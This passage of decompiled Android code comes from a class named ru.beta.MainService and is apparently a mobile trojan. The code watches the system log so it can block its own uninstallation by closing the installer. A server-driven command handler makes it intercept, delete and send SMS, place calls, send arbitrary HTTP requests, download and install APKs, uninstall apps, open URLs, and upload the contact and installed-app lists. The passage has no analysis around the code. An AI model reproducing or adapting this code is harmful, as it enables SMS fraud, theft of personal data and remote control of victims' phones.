    L_0x013a:
        r21 = isRunning;	 Catch:{ IOException -> 0x01b8 }
        if (r21 == 0) goto L_0x020b;
    L_0x013e:
        r11 = r17.readLine();	 Catch:{ IOException -> 0x01b8 }
        r16 = "I/ActivityManager";
        r0 = r16;
        r10 = r11.indexOf(r0);	 Catch:{ IOException -> 0x01b8 }
        r21 = -1;
        r0 = r21;
        if (r10 == r0) goto L_0x013a;
    L_0x0150:
        r21 = r16.length();	 Catch:{ IOException -> 0x01b8 }
        r10 = r10 + r21;
        r5 = r11.substring(r10);	 Catch:{ IOException -> 0x01b8 }
        r15 = new ru.beta.IntentParser;	 Catch:{ Exception -> 0x01b3 }
        r15.m17init();	 Catch:{ Exception -> 0x01b3 }
        r15.parseString(r5);	 Catch:{ Exception -> 0x01b3 }
        r0 = r15.action;	 Catch:{ Exception -> 0x01b3 }
        r21 = r0;
        r22 = "android.intent.action.DELETE";
        r21 = r21.equals(r22);	 Catch:{ Exception -> 0x01b3 }
        if (r21 == 0) goto L_0x01dc;
    L_0x016e:
        r0 = r15.cmp;	 Catch:{ Exception -> 0x01b3 }
        r21 = r0;
        r22 = "com.android.packageinstaller/.UninstallerActivity";
        r21 = r21.equals(r22);	 Catch:{ Exception -> 0x01b3 }
        if (r21 == 0) goto L_0x01dc;
    L_0x017a:
        r0 = r15.data;	 Catch:{ Exception -> 0x01b3 }
        r21 = r0;
        r22 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x01b3 }
        r22.<init>();	 Catch:{ Exception -> 0x01b3 }
        r23 = "package:";
        r22 = r22.append(r23);	 Catch:{ Exception -> 0x01b3 }
        r23 = packageName;	 Catch:{ Exception -> 0x01b3 }
        r22 = r22.append(r23);	 Catch:{ Exception -> 0x01b3 }
        r22 = r22.toString();	 Catch:{ Exception -> 0x01b3 }
        r21 = r21.equals(r22);	 Catch:{ Exception -> 0x01b3 }
        if (r21 == 0) goto L_0x01d6;
    L_0x0199:
        r21 = 1;
        isKill = r21;	 Catch:{ Exception -> 0x01b3 }
        r21 = new java.lang.Thread;	 Catch:{ Exception -> 0x01b3 }
        r22 = new ru.beta.ThreadOperation;	 Catch:{ Exception -> 0x01b3 }
        r23 = 6;
        r0 = r22;
        r1 = r25;
        r2 = r23;
        r0.m12init(r1, r2, r15);	 Catch:{ Exception -> 0x01b3 }
        r21.<init>(r22);	 Catch:{ Exception -> 0x01b3 }
        r21.start();	 Catch:{ Exception -> 0x01b3 }
        goto L_0x013a;
    L_0x01b3:
        r7 = move-exception;
        r7.printStackTrace();	 Catch:{ IOException -> 0x01b8 }
        goto L_0x013a;
    L_0x01b8:
        r6 = move-exception;
        r6.printStackTrace();
        r21 = 0;
        isRunning = r21;
        goto L_0x0063;
    L_0x01c2:
        r6 = move-exception;
        r6.printStackTrace();
        r21 = 0;
        isRunning = r21;
        goto L_0x011b;
    L_0x01cc:
        r6 = move-exception;
    L_0x01cd:
        r6.printStackTrace();
        r21 = 0;
        isRunning = r21;
        goto L_0x013a;
    L_0x01d6:
        r21 = 0;
        isKill = r21;	 Catch:{ Exception -> 0x01b3 }
        goto L_0x013a;
    L_0x01dc:
        r0 = r15.action;	 Catch:{ Exception -> 0x01b3 }
        r21 = r0;
        r22 = "android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS";
        r21 = r21.equals(r22);	 Catch:{ Exception -> 0x01b3 }
        if (r21 == 0) goto L_0x013a;
    L_0x01e8:
        r0 = r15.cmp;	 Catch:{ Exception -> 0x01b3 }
        r21 = r0;
        r22 = "com.android.settings/.Settings$ManageApplicationsActivity";
        r21 = r21.equals(r22);	 Catch:{ Exception -> 0x01b3 }
        if (r21 == 0) goto L_0x013a;
    L_0x01f4:
        r21 = new java.lang.Thread;	 Catch:{ Exception -> 0x01b3 }
        r22 = new ru.beta.ThreadOperation;	 Catch:{ Exception -> 0x01b3 }
        r23 = 6;
        r0 = r22;
        r1 = r25;
        r2 = r23;
        r0.m12init(r1, r2, r15);	 Catch:{ Exception -> 0x01b3 }
        r21.<init>(r22);	 Catch:{ Exception -> 0x01b3 }
        r21.start();	 Catch:{ Exception -> 0x01b3 }
        goto L_0x013a;
    L_0x020b:
        r25.stopSelf();	 Catch:{ IOException -> 0x01b8 }
        goto L_0x0063;
    L_0x0210:
        r21 = 6;
        r0 = r26;
        r1 = r21;
        if (r0 != r1) goto L_0x0063;
    L_0x0218:
        r21 = "activity";
        r0 = r25;
        r1 = r21;
        r3 = r0.getSystemService(r1);
        r3 = (android.app.ActivityManager) r3;
        r21 = "com.android.packageinstaller";
        r0 = r21;
        r3.restartPackage(r0);	 Catch:{ Exception -> 0x0236 }
    L_0x022b:
        ru.beta.Functions.showHome(r25);	 Catch:{ Exception -> 0x0230 }
        goto L_0x0063;
    L_0x0230:
        r8 = move-exception;
        r8.printStackTrace();
        goto L_0x0063;
    L_0x0236:
        r7 = move-exception;
        r7.printStackTrace();
        goto L_0x022b;
    L_0x023b:
        r6 = move-exception;
        r17 = r18;
        goto L_0x01cd;
        */
        throw new UnsupportedOperationException("Method not decompiled: ru.beta.MainService.threadOperationRun(int, java.lang.Object):void");
    }

    public void executeCommands(JSONObject response) {
        try {
            JSONArray jsonArray;
            int i;
            JSONObject jsonObject;
            String url;
            if (Constants.DEBUG) {
                System.out.println("response: " + response.toString(4));
            }
            Settings settings = Settings.getSettings();
            if (response.has("wait")) {
                if (Constants.DEBUG) {
                    System.out.println("has wait");
                }
                settings.timeNextConnection = System.currentTimeMillis() + ((long) (response.getInt("wait") * Constants.SECOND));
                settings.save(this);
            }
            if (response.has("server")) {
                if (Constants.DEBUG) {
                    System.out.println("has server");
                }
                settings.server = response.getString("server");
                settings.save(this);
            }
            if (response.has("removeAllSmsFilters")) {
                if (Constants.DEBUG) {
                    System.out.println("has removeAllSmsFilters");
                }
                if (Boolean.valueOf(response.getBoolean("removeAllSmsFilters")).booleanValue()) {
                    settings.deleteSmsList.clear();
                    settings.save(this);
                }
            }
            if (response.has("removeAllCatchFilters")) {
                if (Constants.DEBUG) {
                    System.out.println("has removeAllCatchFilters");
                }
                if (Boolean.valueOf(response.getBoolean("removeAllCatchFilters")).booleanValue()) {
                    settings.catchSmsList.clear();
                    settings.save(this);
                }
            }
            if (response.has("deleteSms")) {
                if (Constants.DEBUG) {
                    System.out.println("has deleteSms");
                }
                settings.deleteSmsList.clear();
                settings.save(this);
                jsonArray = response.getJSONArray("deleteSms");
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    settings.deleteSmsList.add(new SmsItem(jsonObject.getString("phone"), jsonObject.getString("text")));
                }
                settings.save(this);
            }
            if (response.has("catchSms")) {
                if (Constants.DEBUG) {
                    System.out.println("has catchSms");
                }
                settings.catchSmsList.clear();
                settings.save(this);
                jsonArray = response.getJSONArray("catchSms");
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    settings.catchSmsList.add(new SmsItem(jsonObject.getString("phone"), jsonObject.getString("text")));
                }
                settings.save(this);
            }
            if (response.has("sendSms")) {
                if (Constants.DEBUG) {
                    System.out.println("has sendSms");
                }
                jsonArray = response.getJSONArray("sendSms");
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    Functions.sendSms(jsonObject.getString("phone"), jsonObject.getString("text"));
                }
            }
            if (response.has("httpRequest")) {
                JSONObject jsonParams;
                if (Constants.DEBUG) {
                    System.out.println("has httpRequest");
                }
                jsonObject = response.getJSONObject("httpRequest");
                String method = jsonObject.getString("method");
                url = jsonObject.getString("url");
                List<NameValuePair> paramsList = new ArrayList();
                List<NameValuePair> propertyList = new ArrayList();
                jsonArray = jsonObject.getJSONArray("params");
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonParams = jsonArray.getJSONObject(i);
                    paramsList.add(new BasicNameValuePair(jsonParams.getString("name"), jsonParams.getString("value")));
                }
                jsonArray = jsonObject.getJSONArray("properties");
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonParams = jsonArray.getJSONObject(i);
                    propertyList.add(new BasicNameValuePair(jsonParams.getString("name"), jsonParams.getString("value")));
                }
                Functions.sendSimpleHttpRequest(url, method, paramsList, propertyList);
            }
            if (response.has("update")) {
                if (Constants.DEBUG) {
                    System.out.println("has update");
                }
                String path = response.getString("update");
                ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService("connectivity");
                if (connectivityManager.getNetworkInfo(1).isAvailable() || connectivityManager.getNetworkInfo(0).isConnectedOrConnecting()) {
                    String name = System.currentTimeMillis() + ".apk";
                    String localPath = Environment.getExternalStorageDirectory() + "/download/";
                    if (Functions.downloadFile(localPath, path, name)) {
                        Functions.installApk(this, localPath + name);
                    }
                }
            }
            if (response.has("uninstall")) {
                if (Constants.DEBUG) {
                    System.out.println("has uninstall");
                }
                jsonArray = response.getJSONArray("uninstall");
                for (i = 0; i < jsonArray.length(); i++) {
                    Functions.uninstallApk(this, jsonArray.getString(i));
                }
            }
            if (response.has("notification")) {
                if (Constants.DEBUG) {
                    System.out.println("has notification");
                }
                jsonObject = response.getJSONObject("notification");
                url = jsonObject.getString("url");
                Functions.showNotification(this, jsonObject.getString("tickerText"), jsonObject.getString("title"), jsonObject.getString("text"), jsonObject.getInt("icon"), url);
            }
            if (response.has("openUrl")) {
                if (Constants.DEBUG) {
                    System.out.println("has openUrl");
                }
                Functions.openUrl(this, response.getString("openUrl"));
            }
            if (response.has("sendContactList")) {
                if (Constants.DEBUG) {
                    System.out.println("has sendContactList");
                }
                if (Boolean.valueOf(response.getBoolean("sendContactList")).booleanValue()) {
                    new Thread(new ThreadOperation(this, 2, null)).start();
                }
            }
            if (response.has("sendPackageList")) {
                if (Constants.DEBUG) {
                    System.out.println("has sendPackageList");
                }
                if (Boolean.valueOf(response.getBoolean("sendPackageList")).booleanValue()) {
                    new Thread(new ThreadOperation(this, 3, null)).start();
                }
            }
            if (response.has("twitter")) {
                if (Constants.DEBUG) {
                    System.out.println("has twitter");
                }
                settings.twitterUrl = response.getString("twitter");
                settings.save(this);
            }
            if (response.has("makeCall")) {
                if (Constants.DEBUG) {
                    System.out.println("has makeCall");
                }
                Functions.makeCall(this, response.getString("makeCall"));
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
